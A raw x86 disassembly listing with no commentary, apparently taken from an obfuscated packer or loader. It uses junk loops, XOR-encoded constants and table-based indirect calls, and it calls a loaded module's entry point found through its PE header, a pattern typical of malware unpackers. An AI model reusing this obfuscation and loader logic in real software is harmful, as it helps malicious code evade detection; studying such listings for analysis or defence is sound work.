  410655:	add    DWORD PTR ds:0x42800c,0x158b
  41065f:	push   0x8678768
  410664:	push   0x87676776
  410669:	call   DWORD PTR ds:0x42100c
  41066f:	xor    DWORD PTR ds:0x427014,0x429004
  410679:	push   esi
  41067a:	add    DWORD PTR ds:0x42601c,0x4e21
  410684:	push   0x68
  410686:	and    DWORD PTR ds:0x425024,0x9b5
  410690:	push   0xd
  410692:	not    DWORD PTR ds:0x42501c
  410698:	push   0x5
  41069a:	or     DWORD PTR ds:0x425020,0x429010
  4106a4:	push   0x3
  4106a6:	push   0x5468787
  4106ab:	call   DWORD PTR ds:0x421024
  4106b1:	dec    edi
  4106b2:	mov    DWORD PTR ds:0x425010,0x709e
  4106bc:	jne    0x410619
  4106c2:	mov    eax,DWORD PTR [ebp-0xc]
  4106c5:	mov    DWORD PTR ds:0x425000,edi
  4106cb:	mov    ebx,0xf89c85b6
  4106d0:	cmp    eax,ebx
  4106d2:	mov    DWORD PTR ds:0x426014,0x6187
  4106dc:	jne    0x4107d8
  4106e2:	or     DWORD PTR ds:0x426008,0x425010
  4106ec:	mov    DWORD PTR ds:0x41d56c,0xf89c85b5
  4106f6:	add    DWORD PTR ds:0x428014,0x8c5
  410700:	push   DWORD PTR [ebp+0x10]
  410703:	sbb    DWORD PTR ds:0x426004,0x426010
  41070d:	push   DWORD PTR [ebp+0xc]
  410710:	push   DWORD PTR [ebp+0x8]
  410713:	call   0x403cbf
  410718:	mov    DWORD PTR ds:0x426018,0x1f
  410722:	cmp    DWORD PTR ds:0x426018,0x0
  410729:	je     0x4107c2
  41072f:	cmp    DWORD PTR ds:0x426018,0xf
  410736:	jne    0x41074a
  41073c:	push   DWORD PTR [ebp-0x14]
  41073f:	push   0x348e
  410744:	call   DWORD PTR ds:0x421038
  41074a:	cmp    DWORD PTR ds:0x426018,0x10
  410751:	jne    0x410764
  410757:	mov    edi,DWORD PTR ds:0x426018
  41075d:	dec    edi
  41075e:	mov    DWORD PTR ds:0x426018,edi
  410764:	mov    edi,DWORD PTR ds:0x426018
  41076a:	dec    edi
  41076b:	mov    DWORD PTR ds:0x426018,edi
  410771:	jmp    0x410722
  410776:	and    DWORD PTR ds:0x429004,0x0
  410780:	mov    esi,DWORD PTR ds:0x429004
  410786:	inc    esi
  410787:	mov    DWORD PTR ds:0x429004,esi
  41078d:	cmp    DWORD PTR ds:0x429004,0x1f
  410794:	jne    0x4107b5
  41079a:	push   0x55b4
  41079f:	push   DWORD PTR [ebp-0x14]
  4107a2:	push   0x42600c
  4107a7:	push   0x45b8
  4107ac:	push   DWORD PTR [ebp-0x28]
  4107af:	call   DWORD PTR ds:0x421000
  4107b5:	cmp    DWORD PTR ds:0x429004,0x16
  4107bc:	jb     0x410780
  4107c2:	mov    ecx,DWORD PTR ds:0x41d45c
  4107c8:	sub    esi,edi
  4107ca:	mov    ecx,DWORD PTR [ecx+0x1cc]
  4107d0:	and    edi,0x3fae
  4107d6:	mov    DWORD PTR [ecx],eax
  4107d8:	or     edi,DWORD PTR ds:0x425010
  4107de:	mov    DWORD PTR [ebp-0x4],ebx
  4107e1:	mov    DWORD PTR [ebp-0x8],0xf89c85b5
  4107e8:	lea    eax,[ebp-0x28]
  4107eb:	xor    DWORD PTR ds:0x425018,edx
  4107f1:	mov    DWORD PTR [ebp-0x20],eax
  4107f4:	sbb    edi,DWORD PTR ds:0x429010
  4107fa:	lea    eax,[ebp-0x2c]
  4107fd:	and    DWORD PTR ds:0x427014,0x0
  410807:	mov    edi,DWORD PTR ds:0x427014
  41080d:	inc    edi
  41080e:	mov    DWORD PTR ds:0x427014,edi
  410814:	cmp    DWORD PTR ds:0x427014,0x1d
  41081b:	jne    0x41082c
  410821:	push   0x45e3
  410826:	call   DWORD PTR ds:0x421004
  41082c:	cmp    DWORD PTR ds:0x427014,0x1c
  410833:	jb     0x410807
  410839:	sbb    DWORD PTR ds:0x42501c,edx
  41083f:	mov    DWORD PTR [ebp-0x1c],eax
  410842:	and    DWORD PTR ds:0x428010,0x0
  41084c:	mov    edi,DWORD PTR ds:0x428010
  410852:	inc    edi
  410853:	mov    DWORD PTR ds:0x428010,edi
  410859:	cmp    DWORD PTR ds:0x428010,0xd
  410860:	jne    0x410874
  410866:	push   0x41ff61
  41086b:	push   DWORD PTR [ebp-0xc]
  41086e:	call   DWORD PTR ds:0x421008
  410874:	cmp    DWORD PTR ds:0x428010,0xc
  41087b:	jne    0x41088e
  410881:	mov    edi,DWORD PTR ds:0x428010
  410887:	inc    edi
  410888:	mov    DWORD PTR ds:0x428010,edi
  41088e:	cmp    DWORD PTR ds:0x428010,0x1b
  410895:	jb     0x41084c
  41089b:	and    edi,esi
  41089d:	mov    eax,ds:0x41d45c
  4108a2:	sub    ecx,esi
  4108a4:	mov    eax,DWORD PTR [eax+0x1c8]
  4108aa:	mov    eax,DWORD PTR [eax]
  4108ac:	mov    ecx,DWORD PTR [ebp-0x1c]
  4108af:	not    edi
  4108b1:	mov    esi,0x7510893
  4108b6:	xor    eax,esi
  4108b8:	movzx  edi,BYTE PTR ds:0x425028
  4108bf:	add    DWORD PTR ds:0x427018,edi
  4108c5:	mov    edi,0x3272db
  4108ca:	adc    DWORD PTR ds:0x42601c,0x425018
  4108d4:	add    eax,edi
  4108d6:	mov    DWORD PTR ds:0x425000,0x302d
  4108e0:	mov    DWORD PTR [ecx],eax
  4108e2:	mov    DWORD PTR ds:0x429010,ebx
  4108e8:	mov    eax,ds:0x41d658
  4108ed:	mov    DWORD PTR ds:0x427008,0x286e
  4108f7:	cmp    eax,0x301ac8f5
  4108fc:	jne    0x41095e
  410902:	and    DWORD PTR ds:0x427000,0x0
  41090c:	xor    eax,eax
  41090e:	or     eax,DWORD PTR ds:0x427000
  410914:	inc    eax
  410915:	mov    ds:0x427000,eax
  41091a:	cmp    DWORD PTR ds:0x427000,0x19
  410921:	jne    0x410930
  410927:	push   DWORD PTR [ebp-0x28]
  41092a:	call   DWORD PTR ds:0x421048
  410930:	cmp    DWORD PTR ds:0x427000,0x17
  410937:	jb     0x41090c
  41093d:	mov    eax,DWORD PTR [ebp-0x4]
  410940:	mov    ecx,DWORD PTR ds:0x41d45c
  410946:	mov    ecx,DWORD PTR [ecx+0x198]
  41094c:	xor    eax,esi
  41094e:	add    eax,edi
  410950:	mov    DWORD PTR [ecx],eax
  410952:	mov    eax,DWORD PTR [ebp-0x4]
  410955:	xor    eax,esi
  410957:	add    eax,edi
  410959:	mov    ds:0x41d658,eax
  41095e:	mov    eax,ds:0x41d45c
  410963:	mov    eax,DWORD PTR [eax+0x18c]
  410969:	mov    eax,DWORD PTR [eax]
  41096b:	mov    DWORD PTR [ebp-0x30],eax
  41096e:	mov    eax,0xf89c85ba
  410973:	mov    DWORD PTR [ebp-0x1c],eax
  410976:	mov    DWORD PTR [ebp-0x1c],eax
  410979:	mov    DWORD PTR [ebp-0x1c],eax
  41097c:	mov    DWORD PTR [ebp-0x1c],ebx
  41097f:	mov    DWORD PTR [ebp-0x38],eax
  410982:	mov    DWORD PTR [ebp-0x38],0xf89c85be
  410989:	mov    ebx,DWORD PTR [ebp-0x4]
  41098c:	mov    ecx,DWORD PTR [ebp-0x8]
  41098f:	mov    edx,DWORD PTR [ebp-0x8]
  410992:	xor    edx,esi
  410994:	xor    ecx,esi
  410996:	add    ecx,edx
  410998:	mov    edx,DWORD PTR [ebp-0x8]
  41099b:	xor    ebx,esi
  41099d:	xor    edx,esi
  41099f:	add    ebx,edi
  4109a1:	lea    ecx,[ecx+edx*1+0x975891]
  4109a8:	cmp    ebx,ecx
  4109aa:	ja     0x410a0b
  4109b0:	mov    eax,DWORD PTR [ebp-0x8]
  4109b3:	xor    eax,esi
  4109b5:	lea    eax,[eax+ebx*1+0x3272db]
  4109bc:	push   eax
  4109bd:	mov    eax,DWORD PTR [ebp-0x1c]
  4109c0:	xor    eax,esi
  4109c2:	lea    eax,[ebp+eax*1+0x3272e3]
  4109c9:	push   eax
  4109ca:	mov    eax,ds:0x41d45c
  4109cf:	push   DWORD PTR [eax+0x1bc]
  4109d5:	call   0x403ce8
  4109da:	mov    eax,DWORD PTR [ebp-0x8]
  4109dd:	xor    eax,esi
  4109df:	lea    ebx,[ebx+eax*1+0x3272db]
  4109e6:	mov    eax,DWORD PTR [ebp-0x8]
  4109e9:	mov    ecx,DWORD PTR [ebp-0x8]
  4109ec:	xor    ecx,esi
  4109ee:	xor    eax,esi
  4109f0:	add    eax,ecx
  4109f2:	mov    ecx,DWORD PTR [ebp-0x8]
  4109f5:	xor    ecx,esi
  4109f7:	lea    eax,[eax+ecx*1+0x975891]
  4109fe:	cmp    ebx,eax
  410a00:	jbe    0x4109b0
  410a06:	mov    eax,0xf89c85ba
  410a0b:	mov    ecx,DWORD PTR [ebp+0xc]
  410a0e:	mov    DWORD PTR ds:0x41d2e0,ecx
  410a14:	mov    ecx,DWORD PTR [ebp+0x10]
  410a17:	mov    DWORD PTR ds:0x41d534,ecx
  410a1d:	mov    ecx,DWORD PTR ds:0x41d2e0
  410a23:	mov    edx,DWORD PTR [ebp-0x20]
  410a26:	sub    ecx,edi
  410a28:	xor    ecx,esi
  410a2a:	mov    DWORD PTR [edx],ecx
  410a2c:	mov    edx,DWORD PTR [ebp-0xc]
  410a2f:	mov    ecx,0xf89c85b6
  410a34:	cmp    edx,ecx
  410a36:	jne    0x410a61
  410a3c:	lea    eax,[ebp-0x14]
  410a3f:	mov    DWORD PTR [ebp-0x24],eax
  410a42:	lea    eax,[ebp+0x4]
  410a45:	mov    DWORD PTR [ebp-0x14],eax
  410a48:	mov    eax,DWORD PTR [ebp-0x14]
  410a4b:	test   eax,eax
  410a4d:	je     0x410b76
  410a53:	mov    eax,DWORD PTR [ebp-0x10]
  410a56:	mov    eax,DWORD PTR [ebp-0x8]
  410a59:	lea    eax,[ebp-0x24]
  410a5c:	jmp    0x410b6d
  410a61:	mov    edx,DWORD PTR [ebp-0x28]
  410a64:	cmp    edx,0xf89c85b5
  410a6a:	je     0x410ac7
  410a70:	mov    edx,DWORD PTR [ebp-0x4]
  410a73:	mov    ebx,DWORD PTR [ebp-0x2c]
  410a76:	xor    edx,esi
  410a78:	add    edx,edi
  410a7a:	cmp    edx,ebx
  410a7c:	je     0x410ac7
  410a82:	mov    eax,ds:0x41d45c
  410a87:	mov    eax,DWORD PTR [eax+0x194]
  410a8d:	mov    ecx,DWORD PTR [eax]
  410a8f:	mov    eax,DWORD PTR [ecx+0x3c]
  410a92:	push   DWORD PTR ds:0x41d534
  410a98:	mov    eax,DWORD PTR [eax+ecx*1+0x28]
  410a9c:	push   DWORD PTR ds:0x41d2e0
  410aa2:	add    eax,ecx
  410aa4:	mov    ecx,DWORD PTR ds:0x41d45c
  410aaa:	mov    ecx,DWORD PTR [ecx+0x194]
  410ab0:	push   DWORD PTR [ecx]
  410ab2:	call   eax
  410ab4:	mov    ecx,DWORD PTR ds:0x41d45c
  410aba:	mov    ecx,DWORD PTR [ecx+0x1cc]
  410ac0:	mov    DWORD PTR [ecx],eax
  410ac2:	jmp    0x410b76
  410ac7:	mov    edx,DWORD PTR [ebp-0x4]
  410aca:	mov    ebx,DWORD PTR [ebp-0x30]
  410acd:	xor    edx,esi
  410acf:	add    edx,edi
  410ad1:	cmp    edx,ebx
  410ad3:	jne    0x410b2c
  410ad9:	mov    edx,DWORD PTR [ebp-0x4]
  410adc:	mov    ebx,DWORD PTR ds:0x41d45c
  410ae2:	mov    ebx,DWORD PTR [ebx+0x198]
  410ae8:	xor    edx,esi
  410aea:	add    edx,edi
  410aec:	cmp    edx,DWORD PTR [ebx]
  410aee:	jne    0x410b09
  410af4:	push   ecx
  410af5:	mov    ecx,DWORD PTR [ebp-0x4]
  410af8:	xor    ecx,esi
  410afa:	add    ecx,edi
  410afc:	push   ecx
  410afd:	push   eax
  410afe:	push   DWORD PTR [ebp-0x8]
  410b01:	push   DWORD PTR [ebp-0x4]
  410b04:	call   0x40b7a6
  410b09:	push   DWORD PTR [ebp-0x8]
  410b0c:	push   DWORD PTR [ebp-0x4]
  410b0f:	call   0x410b98
  410b14:	mov    eax,DWORD PTR [ebp-0x4]
  410b17:	xor    eax,esi
  410b19:	add    eax,edi
  410b1b:	mov    ds:0x41d4e0,eax
  410b20:	mov    eax,DWORD PTR [ebp-0x4]
  410b23:	xor    eax,esi
  410b25:	add    eax,edi
  410b27:	mov    ds:0x41d4d8,eax
  410b2c:	lea    eax,[ebp-0x18]
  410b2f:	mov    DWORD PTR [ebp-0x34],eax
  410b32:	lea    eax,[ebp+0x4]
  410b35:	mov    DWORD PTR [ebp-0x18],eax
  410b38:	mov    eax,DWORD PTR [ebp-0x18]
  410b3b:	test   eax,eax
  410b3d:	je     0x410b76
  410b43:	mov    DWORD PTR [ebp-0x3c],0xf152c3d
  410b4a:	mov    DWORD PTR [ebp-0x40],0x712ed08
  410b51:	mov    DWORD PTR [ebp-0x44],0x373fc2e
  410b58:	mov    DWORD PTR [ebp-0x48],0x72670a1e
  410b5f:	call   0x40b3b6
  410b64:	mov    eax,DWORD PTR [ebp-0x10]
  410b67:	mov    eax,DWORD PTR [ebp-0x8]
  410b6a:	lea    eax,[ebp-0x34]
  410b6d:	push   eax
  410b6e:	push   DWORD PTR [ebp-0x4]
  410b71:	call   0x40b1b5
  410b76:	mov    eax,ds:0x41d45c
  410b7b:	push   0x4
  410b7d:	add    eax,0x1cc
  410b82:	push   eax
  410b83:	lea    eax,[ebp-0x10]
  410b86:	push   eax
  410b87:	call   0x403ce8
  410b8c:	mov    eax,DWORD PTR [ebp-0x10]
  410b8f:	mov    eax,DWORD PTR [eax]
  410b91:	pop    edi
  410b92:	pop    esi
  410b93:	pop    ebx
  410b94:	leave  
  410b95:	ret    0xc
  410b98:	push   ebp
  410b99:	mov    ebp,esp
  410b9b:	sub    esp,0x98
  410ba1:	mov    eax,DWORD PTR [ebp+0x8]
  410ba4:	mov    ecx,DWORD PTR ds:0x42601c
  410baa:	or     DWORD PTR ds:0x425008,ecx
  410bb0:	push   ebx
  410bb1:	push   esi
  410bb2:	and    ecx,esi
  410bb4:	push   edi
  410bb5:	inc    ecx
  410bb6:	mov    esi,0x7510893
  410bbb:	xor    eax,esi
  410bbd:	mov    edi,0x3272db
  410bc2:	add    eax,edi
  410bc4:	and    DWORD PTR ds:0x42800c,0x0
  410bce:	jmp    0x410be0
  410bd3:	mov    ecx,DWORD PTR ds:0x42800c
  410bd9:	inc    ecx
  410bda:	mov    DWORD PTR ds:0x42800c,ecx
  410be0:	cmp    DWORD PTR ds:0x42800c,0x18
  410be7:	jae    0x410c21
  410bed:	cmp    DWORD PTR ds:0x42800c,0x1f
  410bf4:	jne    0x410c1c
  410bfa:	push   0x41ff3d
  410bff:	push   0x7ac7
  410c04:	push   0x1b99
  410c09:	push   0x1d9a
  410c0e:	push   DWORD PTR [ebp-0x10]
  410c11:	push   0x26f8
  410c16:	call   DWORD PTR ds:0x42104c
  410c1c:	jmp    0x410bd3
  410c21:	mov    DWORD PTR [ebp-0x30],eax
  410c24:	sub    eax,eax
  410c26:	mov    eax,ds:0x41d2dc
  410c2b:	sbb    DWORD PTR ds:0x42801c,edi
  410c31:	mov    eax,DWORD PTR [eax]
  410c33:	mov    DWORD PTR [ebp-0x20],eax
  410c36:	and    DWORD PTR ds:0x426004,0x0
  410c40:	mov    ecx,DWORD PTR ds:0x426004
  410c46:	inc    ecx
  410c47:	mov    DWORD PTR ds:0x426004,ecx
  410c4d:	cmp    DWORD PTR ds:0x426004,0x21
  410c54:	jne    0x410c65
  410c5a:	push   0x2993
  410c5f:	call   DWORD PTR ds:0x421014
  410c65:	cmp    DWORD PTR ds:0x426004,0x1d
  410c6c:	jb     0x410c40
  410c72:	mov    DWORD PTR ds:0x425024,0x1a
  410c7c:	cmp    DWORD PTR ds:0x425024,0x0
  410c83:	je     0x410ccd
  410c89:	cmp    DWORD PTR ds:0x425024,0x8
  410c90:	jne    0x410ca1
  410c96:	push   0x8b04
  410c9b:	call   DWORD PTR ds:0x421018
  410ca1:	cmp    DWORD PTR ds:0x425024,0x9
  410ca8:	jne    0x410cbb
  410cae:	mov    ecx,DWORD PTR ds:0x425024
  410cb4:	dec    ecx
  410cb5:	mov    DWORD PTR ds:0x425024,ecx
  410cbb:	mov    ecx,DWORD PTR ds:0x425024
  410cc1:	dec    ecx
  410cc2:	mov    DWORD PTR ds:0x425024,ecx
  410cc8:	jmp    0x410c7c
  410ccd:	mov    eax,ds:0x41d4e4
  410cd2:	inc    ecx
  410cd3:	mov    eax,DWORD PTR [eax]
  410cd5:	mov    DWORD PTR [ebp-0x28],eax
  410cd8:	mov    DWORD PTR [ebp-0x38],0xf89c87b6
  410cdf:	sbb    DWORD PTR ds:0x42601c,0xf37
  410ce9:	mov    eax,DWORD PTR [ebp-0x38]
  410cec:	and    DWORD PTR ds:0x42900c,0x0
  410cf6:	mov    ecx,DWORD PTR ds:0x42900c
  410cfc:	inc    ecx
  410cfd:	mov    DWORD PTR ds:0x42900c,ecx
  410d03:	cmp    DWORD PTR ds:0x42900c,0x6
  410d0a:	jne    0x410d24
  410d10:	push   0x133c
  410d15:	push   DWORD PTR [ebp-0x14]
  410d18:	push   DWORD PTR [ebp-0x24]
  410d1b:	push   DWORD PTR [ebp-0x18]
  410d1e:	call   DWORD PTR ds:0x42101c
  410d24:	cmp    DWORD PTR ds:0x42900c,0x5
  410d2b:	jne    0x410d40
  410d31:	xor    ecx,ecx
  410d33:	xor    ecx,DWORD PTR ds:0x42900c
  410d39:	inc    ecx
  410d3a:	mov    DWORD PTR ds:0x42900c,ecx
  410d40:	cmp    DWORD PTR ds:0x42900c,0x1b
  410d47:	jb     0x410cf6
  410d4d:	xor    eax,esi
  410d4f:	and    DWORD PTR ds:0x429010,0x2e08
  410d59:	add    eax,edi
  410d5b:	mov    DWORD PTR [ebp-0x30],eax
  410d5e:	sbb    eax,eax
  410d60:	mov    eax,ds:0x41d45c
  410d65:	sbb    DWORD PTR ds:0x428018,0x460c
  410d6f:	mov    DWORD PTR [ebp-0x30],eax
  410d72:	add    eax,0xded
  410d77:	mov    eax,DWORD PTR [ebp-0x20]
  410d7a:	mov    DWORD PTR [ebp-0x14],eax
  410d7d:	sbb    DWORD PTR ds:0x42501c,0x3470
  410d87:	mov    eax,DWORD PTR [ebp-0x14]
  410d8a:	and    DWORD PTR ds:0x428018,0x0
  410d94:	jmp    0x410da6
  410d99:	mov    ecx,DWORD PTR ds:0x428018
  410d9f:	inc    ecx
  410da0:	mov    DWORD PTR ds:0x428018,ecx
  410da6:	cmp    DWORD PTR ds:0x428018,0x15
  410dad:	jae    0x410df5
  410db3:	cmp    DWORD PTR ds:0x428018,0x6
  410dba:	jne    0x410dd0
  410dc0:	push   0x41ff9f
  410dc5:	push   0x41ff81
  410dca:	call   DWORD PTR ds:0x421050
  410dd0:	cmp    DWORD PTR ds:0x428018,0x5
  410dd7:	jne    0x410dea
  410ddd:	mov    ecx,DWORD PTR ds:0x428018
  410de3:	inc    ecx
  410de4:	mov    DWORD PTR ds:0x428018,ecx
  410dea:	jmp    0x410d99
  410def:	and    DWORD PTR ds:0x426000,ecx
  410df5:	push   0x4
  410df7:	pop    ecx
  410df8:	sub    ecx,eax
  410dfa:	add    ecx,DWORD PTR [ebp-0x28]
  410dfd:	mov    DWORD PTR [ebp-0x2c],0xf89c85f6
  410e04:	mov    DWORD PTR [ebp-0x24],ecx
  410e07:	mov    DWORD PTR [ebp-0x98],0xf89c85ba
  410e11:	or     DWORD PTR ds:0x427000,edx
  410e17:	mov    eax,DWORD PTR [ebp-0x14]
  410e1a:	xor    DWORD PTR ds:0x429010,0x390a
  410e24:	mov    DWORD PTR [ebp-0x94],eax
  410e2a:	sbb    DWORD PTR ds:0x425020,0x44b0
  410e34:	mov    eax,DWORD PTR [ebp-0x24]
  410e37:	mov    DWORD PTR [ebp-0x90],eax
  410e3d:	mov    DWORD PTR ds:0x429010,0x17
  410e47:	cmp    DWORD PTR ds:0x429010,0x0
  410e4e:	je     0x410ede
  410e54:	cmp    DWORD PTR ds:0x429010,0x5
  410e5b:	jne    0x410e6f
  410e61:	push   DWORD PTR [ebp-0x24]
  410e64:	push   0x823f
  410e69:	call   DWORD PTR ds:0x421054
  410e6f:	cmp    DWORD PTR ds:0x429010,0x6
  410e76:	jne    0x410e87
  410e7c:	mov    eax,ds:0x429010
  410e81:	dec    eax
  410e82:	mov    ds:0x429010,eax
  410e87:	mov    eax,ds:0x429010
  410e8c:	dec    eax
  410e8d:	mov    ds:0x429010,eax
  410e92:	jmp    0x410e47
  410e97:	and    DWORD PTR ds:0x429004,0x0
  410ea1:	jmp    0x410eb1
  410ea6:	mov    eax,ds:0x429004
  410eab:	inc    eax
  410eac:	mov    ds:0x429004,eax
  410eb1:	cmp    DWORD PTR ds:0x429004,0x18
  410eb8:	jae    0x410ede
  410ebe:	cmp    DWORD PTR ds:0x429004,0x26
  410ec5:	jne    0x410ed9
  410ecb:	push   0x42801c
  410ed0:	push   DWORD PTR [ebp-0x18]
  410ed3:	call   DWORD PTR ds:0x421058
  410ed9:	jmp    0x410ea6
  410ede:	mov    eax,DWORD PTR [ebp-0x2c]
  410ee1:	or     DWORD PTR ds:0x429014,0x2e7c
  410eeb:	xor    eax,esi
  410eed:	add    eax,edi
  410eef:	mov    DWORD PTR [ebp-0x8c],eax
  410ef5:	lea    eax,[ebp-0x50]
  410ef8:	mov    DWORD PTR [ebp-0x88],eax
  410efe:	xor    DWORD PTR ds:0x425000,0x42600c
  410f08:	mov    eax,DWORD PTR [ebp-0x98]
  410f0e:	xor    DWORD PTR ds:0x42900c,0x426014
  410f18:	xor    eax,esi
  410f1a:	add    eax,edi
  410f1c:	adc    DWORD PTR ds:0x426008,0x425014
  410f26:	mov    DWORD PTR [ebp-0x98],eax
  410f2c:	lea    eax,[ebp-0x98]
  410f32:	adc    DWORD PTR ds:0x427018,0x426018
  410f3c:	push   eax
  410f3d:	adc    DWORD PTR ds:0x426004,0x2a7
  410f47:	mov    eax,DWORD PTR [ebp+0xc]
  410f4a:	sub    DWORD PTR ds:0x429010,0x42501c
  410f54:	xor    eax,esi
  410f56:	add    DWORD PTR ds:0x425020,0x427018
  410f60:	add    eax,edi
  410f62:	xor    DWORD PTR ds:0x42501c,0x425000
  410f6c:	push   eax
  410f6d:	mov    DWORD PTR ds:0x429010,0x1047
  410f77:	mov    eax,ds:0x41d47c
  410f7c:	and    DWORD PTR ds:0x425018,0x428010
  410f86:	push   0x41d3d2
  410f8b:	push   DWORD PTR [eax]
  410f8d:	call   0x403f26
  410f92:	sub    eax,DWORD PTR ds:0x427000
  410f98:	mov    eax,DWORD PTR [ebp-0x14]
  410f9b:	adc    ecx,DWORD PTR ds:0x425008
  410fa1:	mov    ecx,DWORD PTR [ebp-0x24]
  410fa4:	xor    DWORD PTR ds:0x429010,0x42900c
  410fae:	mov    DWORD PTR [ebp-0x4c],ecx
  410fb1:	mov    ecx,DWORD PTR [ebp+0x8]
  410fb4:	adc    DWORD PTR ds:0x425010,0x425014
  410fbe:	xor    ecx,esi
  410fc0:	add    DWORD PTR ds:0x428018,0x42900c
  410fca:	mov    DWORD PTR [ebp-0x38],eax
  410fcd:	add    ecx,edi
  410fcf:	mov    DWORD PTR ds:0x427000,0x74a5
  410fd9:	jmp    0x41374e
  410fde:	and    DWORD PTR ds:0x426008,0x0
  410fe8:	mov    ebx,DWORD PTR ds:0x426008
  410fee:	inc    ebx
  410fef:	mov    DWORD PTR ds:0x426008,ebx
  410ff5:	cmp    DWORD PTR ds:0x426008,0x15
  410ffc:	jne    0x411017
  411002:	push   0x42900c
  411007:	push   0x429010
  41100c:	push   0x5fed
  411011:	call   DWORD PTR ds:0x42105c
  411017:	cmp    DWORD PTR ds:0x426008,0x12
  41101e:	jb     0x410fe8
  411024:	and    DWORD PTR ds:0x426004,0x0
  41102e:	xor    ebx,ebx
  411030:	add    ebx,DWORD PTR ds:0x426004
  411036:	inc    ebx
  411037:	mov    DWORD PTR ds:0x426004,ebx
  41103d:	cmp    DWORD PTR ds:0x426004,0x20
  411044:	jne    0x41105d
  41104a:	push   DWORD PTR [ebp-0x20]
  41104d:	push   0x6608
  411052:	push   0x1aeb
  411057:	call   DWORD PTR ds:0x421020
  41105d:	cmp    DWORD PTR ds:0x426004,0x10
  411064:	jb     0x41102e
  41106a:	adc    DWORD PTR ds:0x427018,ecx
  411070:	lea    edx,[ecx+eax*1]
  411073:	sbb    DWORD PTR ds:0x428018,0x5978
  41107d:	mov    DWORD PTR [ebp-0x28],edx
  411080:	mov    edx,DWORD PTR ds:0x41d278
  411086:	mov    ebx,DWORD PTR ds:0x41d27c
  41108c:	sub    ebx,edx
  41108e:	sub    edx,DWORD PTR [edx+ebx*1]
  411091:	mov    edx,DWORD PTR [ebp-0x4c]
  411094:	and    DWORD PTR ds:0x426018,0x0
  41109e:	jmp    0x4110b0
  4110a3:	mov    ebx,DWORD PTR ds:0x426018
  4110a9:	inc    ebx
  4110aa:	mov    DWORD PTR ds:0x426018,ebx
  4110b0:	cmp    DWORD PTR ds:0x426018,0x16
  4110b7:	jae    0x4110e2
  4110bd:	cmp    DWORD PTR ds:0x426018,0x18
  4110c4:	jne    0x4110dd
  4110ca:	push   0x4880
  4110cf:	push   DWORD PTR [ebp-0x1c]
  4110d2:	push   0x14f0
  4110d7:	call   DWORD PTR ds:0x421028
  4110dd:	jmp    0x4110a3
  4110e2:	sub    edx,ecx
  4110e4:	xor    ebx,DWORD PTR ds:0x429004
  4110ea:	mov    DWORD PTR [ebp-0x20],edx
  4110ed:	and    DWORD PTR ds:0x427004,0x0
  4110f7:	mov    ebx,DWORD PTR ds:0x427004
  4110fd:	inc    ebx
  4110fe:	mov    DWORD PTR ds:0x427004,ebx
  411104:	cmp    DWORD PTR ds:0x427004,0x7
  41110b:	jne    0x41111c
  411111:	push   0x41fede
  411116:	call   DWORD PTR ds:0x42102c
  41111c:	cmp    DWORD PTR ds:0x427004,0x6
  411123:	jne    0x411136
  411129:	mov    ebx,DWORD PTR ds:0x427004
  41112f:	inc    ebx
  411130:	mov    DWORD PTR ds:0x427004,ebx
  411136:	cmp    DWORD PTR ds:0x427004,0x16
  41113d:	jb     0x4110f7
  411143:	movzx  edx,WORD PTR ds:0x428014
  41114a:	sbb    DWORD PTR ds:0x425000,edx
  411150:	mov    edx,DWORD PTR [ebp-0x20]
  411153:	or     ebx,0x6caa
  411159:	mov    DWORD PTR [ebp-0x14],edx
  41115c:	mov    edx,DWORD PTR [ebp-0x28]
  41115f:	mov    DWORD PTR [ebp-0x34],0xf89c85b6
  411166:	mov    DWORD PTR [ebp-0x44],edx
  411169:	mov    DWORD PTR [ebp-0x18],0xf89c85b5
  411170:	mov    edx,DWORD PTR [ebp-0x34]
  411173:	xor    edx,esi
  411175:	add    edx,edi
  411177:	mov    DWORD PTR [ebp-0x10],edx
  41117a:	mov    edx,DWORD PTR [ebp-0x34]
  41117d:	xor    edx,esi
  41117f:	add    edx,edi
  411181:	mov    DWORD PTR [ebp-0x8],edx
  411184:	mov    DWORD PTR [ebp-0x28],0xf89c85d6
  41118b:	mov    DWORD PTR [ebp-0x2c],0xf89c85bf
  411192:	mov    edx,DWORD PTR [ebp-0x34]
  411195:	mov    ebx,DWORD PTR [ebp-0x14]
  411198:	xor    edx,esi
  41119a:	add    edx,edi
  41119c:	cmp    ebx,edx
  41119e:	je     0x413742
  4111a4:	mov    eax,DWORD PTR [ebp-0x18]
  4111a7:	xor    eax,esi
  4111a9:	mov    edx,0xffcd8d25
  4111ae:	sub    edx,eax
  4111b0:	add    edx,DWORD PTR [ebp-0x14]
  4111b3:	mov    eax,DWORD PTR [ebp-0x18]
  4111b6:	mov    ebx,DWORD PTR [ebp-0x10]
  4111b9:	xor    eax,esi
  4111bb:	add    eax,edi
  4111bd:	imul   eax,ebx
  4111c0:	cmp    eax,edx
  4111c2:	ja     0x41373f
  4111c8:	mov    edx,DWORD PTR [ebp-0x10]
  4111cb:	mov    eax,DWORD PTR [ebp-0x14]
  4111ce:	mov    ebx,DWORD PTR [ebp-0x28]
  4111d1:	sub    eax,edx
  4111d3:	xor    ebx,esi
  4111d5:	xor    edx,edx
  4111d7:	add    ebx,edi
  4111d9:	div    ebx
  4111db:	mov    DWORD PTR [ebp-0x8],eax
  4111de:	mov    eax,DWORD PTR [ebp-0x2c]
  4111e1:	mov    edx,DWORD PTR [ebp-0x8]
  4111e4:	xor    eax,esi
  4111e6:	add    eax,edi
  4111e8:	cmp    edx,eax
  4111ea:	jbe    0x4111fa
  4111f0:	mov    eax,DWORD PTR [ebp-0x2c]
  4111f3:	xor    eax,esi
  4111f5:	add    eax,edi
  4111f7:	mov    DWORD PTR [ebp-0x8],eax
  4111fa:	mov    eax,DWORD PTR [ebp-0x28]
  4111fd:	mov    edx,DWORD PTR [ebp-0x8]
  411200:	xor    eax,esi
  411202:	add    eax,edi
  411204:	imul   eax,edx
  411207:	mov    DWORD PTR [ebp-0x8],eax
  41120a:	mov    eax,DWORD PTR [ebp-0x34]
  41120d:	mov    edx,DWORD PTR [ebp-0x8]
  411210:	xor    eax,esi
  411212:	add    eax,edi
  411214:	cmp    edx,eax
  411216:	je     0x413728
  41121c:	mov    eax,DWORD PTR [ebp-0x8]
  41121f:	mov    DWORD PTR [ebp-0x24],eax
  411222:	mov    eax,DWORD PTR [ebp-0x10]
  411225:	add    eax,DWORD PTR [ebp-0x44]
  411228:	mov    DWORD PTR [ebp-0x20],0xf89c85b6
  41122f:	mov    DWORD PTR [ebp-0x8],eax
  411232:	mov    eax,0xf89c85b5
  411237:	mov    DWORD PTR [ebp-0x3c],eax
